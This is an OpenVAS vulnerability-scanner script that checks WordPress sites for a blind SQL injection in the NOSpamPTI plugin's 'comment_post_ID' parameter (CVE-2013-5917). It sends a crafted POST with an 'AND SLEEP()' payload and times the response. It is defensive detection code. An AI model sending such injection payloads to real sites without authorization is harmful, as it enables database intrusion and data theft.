###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_nospampti_blind_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# WordPress NOSpamPTI Plugin 'comment_post_ID' Parameter SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804021";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-5917");
  script_bugtraq_id(62580);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-09-27 18:32:16 +0530 (Fri, 27 Sep 2013)");
  script_name("WordPress NOSpamPTI Plugin 'comment_post_ID' Parameter SQL Injection Vulnerability");

  tag_summary =
"This host is installed with WordPress NOSpamPTI plugin and is prone to sql
injection vulnerability.";

  tag_vuldetect =
"Send a crafted HTTP POST request and check whether it is able to execute sql
command or not.";

  tag_insight =
"Input passed via the 'comment_post_ID' parameter to wp-comments-post.php
script is not properly sanitised before being used in the code.";

  tag_impact =
"Successful exploitation will allow attacker to inject or manipulate SQL
queries in the back-end database, allowing for the manipulation or
disclosure of arbitrary data.

Impact Level: Application";

  tag_affected =
"WordPress NOSpamPTI Plugin version 2.1 and prior.";

  tag_solution =
"No solution or patch is available as of 29th September, 2013. Information
regarding this issue will be updated once the solution details are available.
For Updated refer to http://wordpress.org/plugins/nospampti";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/97528");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Sep/101");
  script_summary("Check if WordPress NOSpamPTI plugin is prone to sql injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

## Variable Initialization
http_port = 0;
temp = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  http_port = 80;
}

## Check the port status
if(!get_port_state(http_port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:http_port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

url = dir + "/wp-comments-post.php";

sleep = make_list(1 , 3);

foreach i (sleep)
{
  comment = rand_str(length:8);

  ## Construct the POST data
  postData = "author=OpenVAS&email=test%40mail.com&url=1&comment=" + comment  +
             "&submit=Post+Comment&comment_post_ID=1 AND SLEEP(" + i + ")&comment_parent=0";

  ## Construct the POST request
  asReq = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", get_host_name(), "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData), "\r\n",
                 "\r\n", postData);

  start = unixtime();
  asRes = http_keepalive_send_recv(port:http_port, data:asReq);
  stop = unixtime();

  if(stop - start < i || stop - start > (i+5)) exit(0); # not vulnerable
  else temp += 1;
}

if (temp == 2 )
{
  security_hole(port:http_port);
  exit(0);
}
